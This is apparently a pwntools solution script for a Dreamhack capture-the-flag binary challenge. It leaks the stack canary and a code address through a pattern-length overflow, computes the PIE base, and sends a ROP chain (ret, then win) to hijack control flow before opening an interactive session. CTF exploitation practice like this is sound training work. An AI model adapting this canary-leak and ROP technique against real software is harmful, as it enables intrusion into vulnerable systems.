#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 13237)

    return r


def find_pattern_size(target_offset):
    for pattern_size in range(80, 0, -1):
        if target_offset % pattern_size == 0:
            if (target_offset - pattern_size) < 1000:
                return pattern_size
    return None


def main():
    r = conn()

    # leak canary
    pattern_size = find_pattern_size(1001)
    r.sendafter(b"Pattern: ", b"A" * pattern_size)
    r.sendlineafter(b"Target length: ", b"1000")
    r.recvn(1001)
    canary = b"\x00" + r.recvn(7)

    # leak main
    pattern_size = find_pattern_size(1032)
    r.sendafter(b"Pattern: ", b"A" * pattern_size)
    r.sendlineafter(b"Target length: ", b"1000")
    r.recvn(1032)
    main = u64(r.recvn(6) + 2*b"\x00")

    # calculate absolute addresses of win and gadget
    bin_base = main - exe.symbols["main"]
    win = bin_base + exe.symbols["win"]
    gadget = bin_base + ROP(exe).find_gadget(["ret"])[0]

    # construct final payload: restore canary, dummy SFP, and ROP chain (ret -> win)
    pattern_size = find_pattern_size(1032)
    pattern = (canary + b"A"*8 + p64(gadget) + p64(win)).rjust(pattern_size, b"A")
    r.sendafter(b"Pattern: ", pattern)
    r.sendlineafter(b"Target length: ", b"1000")

    # break loop
    r.sendafter(b"Pattern: ", b"DUMMY")
    r.sendlineafter(b"Target length: ", b"1001")

    r.interactive()


if __name__ == "__main__":
    main()
